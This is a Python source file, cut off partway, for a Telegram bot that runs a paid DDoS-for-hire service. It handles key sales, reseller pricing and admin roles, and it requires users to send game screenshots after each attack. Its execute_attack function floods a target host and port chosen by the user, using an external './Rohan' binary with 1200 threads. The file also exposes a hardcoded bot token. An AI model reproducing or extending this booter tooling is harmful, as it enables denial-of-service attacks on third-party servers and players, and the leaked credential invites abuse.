import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import random
from dateutil.relativedelta import relativedelta
import pytz
import shutil
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
import hashlib

# Random cyberpunk quotes for dynamic headers
cyberpunk_quotes = [
    "FORGED IN NEBULA FLAMES",
    "HACKING THE GALACTIC CORE",
    "UNLOCKING THE VOID MATRIX",
    "POWER FROM COSMIC FURY",
    "CRAFTED IN HYPERSPACE",
    "BORN IN STARFIRE",
]

# Set Indian……

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('8147615549:AAGW6usLYzRZzaNiDf2b0NEDM0ZaVa6qZ7E')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session  # Attach the session with retries to the bot

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames (loaded from file)
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
FEEDBACK_FILE = os.path.join(DATA_DIR, "feedback.json")  # New file for feedback
MAX_BACKUPS = 5

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}  # Stores user_id: {expiration, context}
keys = {}   # Stores key: {duration, device_limit, devices, blocked, context}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0  # Cooldown removed as per March 05, 2025
resellers = {}
feedback_data = {}  # Stores user_id: [{feedback_hash, timestamp, message_id}]

# Stats tracking
bot_start_time = datetime.datetime.now(IST)  # For uptime calculation
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],  # Changed from set() to list
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0
    }
}

# Compulsory message with enhanced scam warning
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "*🔥 SCAM SE BACHKE! 🔥*\n"
    "Agar koi bhi Rahul DDoS bot ka key *kisi aur se* kharidta hai, toh kisi bhi scam ka *koi responsibility nahi*! 😡\n"
    "*🚨 Possible Scams*: Fake keys, expired keys, duplicate keys, phishing links, or payment frauds! 🚫\n"
    "*✅ Sirf @Rahul_618 se key lo – yeh hai Trusted Dealer!* 💎\n"
    "🌐 *JOIN KAR*: https://t.me/devil_ddos\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE, FEEDBACK_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    elif file == FEEDBACK_FILE:
                        json.dump({}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames, stats, COOLDOWN_PERIOD, feedback_data
    initialize_system()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    for uid, info in list(data.items()):
                        try:
                            exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            if datetime.datetime.now(IST) > exp_date:
                                del data[uid]
                                stats["expired_keys"] += 1
                            else:
                                data[uid] = info
                                stats["total_users"].add(uid)
                        except (ValueError, KeyError):
                            del data[uid]
                    if file == USER_FILE:
                        users = data
                    else:
                        authorized_users = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                        del keys_data[key_name]
                        stats["expired_keys"] += 1
                    else:
                        keys_data[key_name] = key_info
                        stats["total_keys"] += 1
                        stats["key_gen_timestamps"].append(generated_time)
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            # Load feedback
            with open(FEEDBACK_FILE, 'r', encoding='utf-8') as f:
                feedback_data_load = json.load(f)
                if not isinstance(feedback_data_load, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {FEEDBACK_FILE}, Invalid data type: {type(feedback_data_load)}", "Resetting file")
                    reset_json_file(FEEDBACK_FILE, {})
                    feedback_data_load = {}
                feedback_data = feedback_data_load

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                reset_json_file(FEEDBACK_FILE, {})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                feedback_data = {}
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)
    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)
    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)
    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)
    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
    with open(FEEDBACK_FILE, 'w', encoding='utf-8') as f:
        json.dump(feedback_data, f, indent=4)
    print("All data saved successfully.")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
        shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        escaped_text = formatting.escape_markdown(text_with_compulsory)
        bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            escaped_text = formatting.escape_markdown(append_compulsory_message(text))
            bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Feedback utility functions
def hash_image(image_data):
    return hashlib.sha256(image_data).hexdigest()

def has_valid_feedback(user_id, chat_type):
    if user_id not in feedback_data or not feedback_data[user_id]:
        return False
    # Check if the user has submitted feedback within the last 24 hours
    current_time = datetime.datetime.now(IST)
    for feedback in feedback_data[user_id]:
        feedback_time = datetime.datetime.strptime(feedback['timestamp'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        if (current_time - feedback_time).total_seconds() < 24 * 3600:
            return True
    return False

def is_duplicate_feedback(user_id, image_hash):
    if user_id in feedback_data:
        for feedback in feedback_data[user_id]:
            if feedback['feedback_hash'] == image_hash:
                return True
    return False

# Stats utility functions
def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 280]
    return len(stats["active_users"])

# Live Stats Dashboard for Overlord
def live_stats_update(chat_id, message_id):
    while True:
        active_users = update_active_users()
        active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
        command_usage_str = "\n".join([f"📜 */{cmd}*: __{count}__" for cmd, count in stats["command_usage"].items()])
        memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02  # Simulated memory usage in MB
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COSMIC LIVE STATS (OVERLORD) ⚡️*\n"
            f"*🔥 Bhai Overlord, yeh hai live report card! 🔥*\n\n"
            f"*VAULT STATUS:*\n"
            f"🔑 *Total Keys*: __{stats['total_keys']}__\n"
            f"🔑 *Active Keys*: __{active_keys}__\n"
            f"🔓 *Redeemed Keys*: __{stats['redeemed_keys']}__\n"
            f"❌ *Expired Keys*: __{stats['expired_keys']}__\n"
            f"🔑 *Keys/min*: __{calculate_keys_per_minute()}__\n\n"
            f"*ATTACK STATUS:*\n"
            f"💥 *Active Attacks*: __{stats['active_attacks']}__\n"
            f"💥 *Total Attacks*: __{stats['total_attacks']}__\n"
            f"⏱️ *Avg Attack Duration*: __{calculate_avg_attack_duration()}__\n\n"
            f"*USER STATUS:*\n"
            f"👥 *Total Users*: __{len(stats['total_users'])}__\n"
            f"👤 *Active Users (Last 5 min)*: __{active_users}__\n"
            f"👥 *Peak Active Users*: __{stats['peak_active_users']}__\n\n"
            f"*SYSTEM STATUS:*\n"
            f"⏳ *Bot Uptime*: __{calculate_uptime()}__\n"
            f"⚙️ *Memory Usage (Simulated)*: __{memory_usage:.2f}MB__\n\n"
            f"*COMMAND USAGE:*\n{command_usage_str}\n\n"
            f"*📅 Last Updated*: __{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}__\n"
            f"```nebula> overlord_stats\nstatus: RUNNING 🚀```\n"
            f"*⚡️ Cosmic power unleashed, bhai! ⚡️*\n"
            f"~~~ NEON EXIT ~~~"
        )
        try:
            bot.edit_message_text(append_compulsory_message(response), chat_id, message_id, parse_mode="MarkdownV2")
        except telebot.apihelper.ApiTelegramException as e:
            log_error(f"Stats update error: {str(e)}", "system", "system")
            break
        time.sleep(10)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id, chat_type):
    if active_attacks.get(user_id, False):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ATTACK ERROR ⚡️*\n\n"
            f"*STATUS*: Bhai, ek attack already chal raha hai! 😡\n\n"
            f"*COSMIC COMMAND*: Thoda ruk, fir nayi attack daal! ⏳\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    try:
        packet_size = 512
        if packet_size < 1 or packet_size > 65507:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ ATTACK ERROR ⚡️*\n\n"
                f"*STATUS*: Packet size 1 se 65507 ke beech hona chahiye! ❌\n\n"
                f"*COSMIC COMMAND*: Sahi packet size daal, bhai! 📋\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        full_command = f"./Rohan {target} {port} {time} 1200 512"
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ {random.choice(cyberpunk_quotes)} ⚡️*\n\n"
            f"*ATTACK DEPLOYED:*\n"
            f"🎯 *Target*: {target}:{port}\n"
            f"⏳ *Time*: {time} seconds\n"
            f"📏 *Packet Size*: {packet_size} bytes\n"
            f"🔗 *Threads*: 1200\n"
            f"👤 *Attacker*: @{username}\n\n"
            f"*COSMIC INSIGHT*: Attack chal gaya, ab dushman ki khair nahi! 💥\n\n"
        )
        if chat_type == 'group' and not is_overlord(user_id, username):
            response += (
                f"*FEEDBACK ZAROORI*: Attack khatam hone ke baad, BGMI ka screenshot bhejna compulsory hai agli attack ke liye! 📸\n"
                f"🚨 *Warning*: Same ya duplicate screenshot nahi chalega, nahi toh attack permission nahi milegi! 🚫\n"
            )
        elif chat_type == 'private' and not is_overlord(user_id, username):
            response += (
                f"*FEEDBACK ZAROORI*: Attack khatam hone ke baad, BGMI ka screenshot bhejna zaroori hai. Yeh optional nahi hai, par compulsory bhi nahi. 📸\n"
            )
        response += (
            f"*COSMIC COMMAND*: /stats dekh attack ka report card! 📊\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: send_attack_finished_message(chat_id, user_id, username, chat_type), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        active_attacks[user_id] = True
        stats["active_attacks"] += 1
        stats["total_attacks"] += 1
        stats["attack_durations"].append(time)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200", response)
    except Exception as e:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ SYSTEM ERROR ⚡️*\n\n"
            f"*STATUS*: Attack nahi chal saka, bhai! 😢\n"
            f"*Error*: {str(e)}\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 ko bol, issue fix karenge! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
            stats["active_attacks"] -= 1

def send_attack_finished_message(chat_id, user_id, username, chat_type):
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ ATTACK COMPLETED ⚡️*\n\n"
        f"*STATUS*: Attack khatam, bhai! 💪\n\n"
    )
    if chat_type == 'group' and not is_overlord(user_id, username):
        response += (
            f"*FEEDBACK ZAROORI*: Ab BGMI ka screenshot bhejna compulsory hai agli attack ke liye! 📸\n"
            f"🚨 *Warning*: Same ya duplicate screenshot nahi chalega, nahi toh attack permission nahi milegi! 🚫\n"
        )
    elif chat_type == 'private' and not is_overlord(user_id, username):
        response += (
            f"*FEEDBACK ZAROORI*: Ab BGMI ka screenshot bhejna zaroori hai. Yeh optional nahi hai, par compulsory bhi nahi. 📸\n"
        )
    response += (
        f"*COSMIC COMMAND*: /attack fir se try kar ya /stats dekh! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    bot.send_message(chat_id, formatting.escape_markdown(append_compulsory_message(response)), parse_mode="MarkdownV2")

@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    # Download the photo
    file_info = bot.get_file(message.photo[-1].file_id)
    file = requests.get(f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}')
    image_data = file.content
    image_hash = hash_image(image_data)

    # Check for duplicate feedback
    if is_duplicate_feedback(user_id, image_hash):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ DUPLICATE FEEDBACK ⚡️*\n\n"
            f"*STATUS*: Yeh screenshot pehle bheja ja chuka hai! 😡\n"
            f"🚨 *Warning*: Naya aur alag BGMI screenshot bhej, nahi toh agli attack nahi chalegi! 🚫\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "Feedback", f"Duplicate screenshot detected, Hash: {image_hash}", response)
        return

    # Store feedback
    if user_id not in feedback_data:
        feedback_data[user_id] = []
    feedback_data[user_id].append({
        'feedback_hash': image_hash,
        'timestamp': datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        'message_id': message.message_id
    })
    save_data()

    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ FEEDBACK RECEIVED ⚡️*\n\n"
        f"*STATUS*: BGMI screenshot mil gaya, bhai! 📸\n"
    )
    if chat_type == 'group':
        response += (
            f"*COSMIC INSIGHT*: Ab agli attack ke liye ready hai! 🚀\n"
        )
    else:
        response += (
            f"*COSMIC INSIGHT*: Feedback ke liye shukriya, ab attack ke liye ready hai! 🚀\n"
        )
    response += (
        f"*COSMIC COMMAND*: /attack try kar! 💥\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "Feedback", f"Screenshot received, Hash: {image_hash}", response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /addadmin <username_or_id>\n"
            f"*Example*: /addadmin @user123 ya /addadmin 123456789 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ OVERLORD ALERT ⚡️*\n\n"
                f"*STATUS*: Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        if target_username in admin_usernames:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ ALREADY ADMIN ⚡️*\n\n"
                f"*STATUS*: {target} pehle se hi admin hai! ✅\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        admin_usernames.add(target_username)
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ADMIN ADDED ⚡️*\n\n"
            f"*STATUS*: Admin add ho gaya! 🎉\n"
            f"*Username*: {target}\n\n"
            f"*COSMIC COMMAND*: /checkadmin dekh list! ✅\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ OVERLORD ALERT ⚡️*\n\n"
                    f"*STATUS*: Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai! 👑\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            if target_id in admin_id:
                response = (
                    f"~~~ NEON GATEWAY ~~~ 🌌\n"
                    f"*⚡️ ALREADY ADMIN ⚡️*\n\n"
                    f"*STATUS*: User ID {target_id} pehle se hi admin hai! ✅\n"
                    f"~~~ NEON EXIT ~~~"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            admin_id.add(target_id)
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ ADMIN ADDED ⚡️*\n\n"
                f"*STATUS*: Admin add ho gaya! 🎉\n"
                f"*User ID*: {target_id}\n\n"
                f"*COSMIC COMMAND*: /checkadmin dekh list! ✅\n"
                f"~~~ NEON EXIT ~~~"
            )
        except ValueError:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Target: {target}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removeadmin"] += 1
    stats["total_users"].add(user_id)
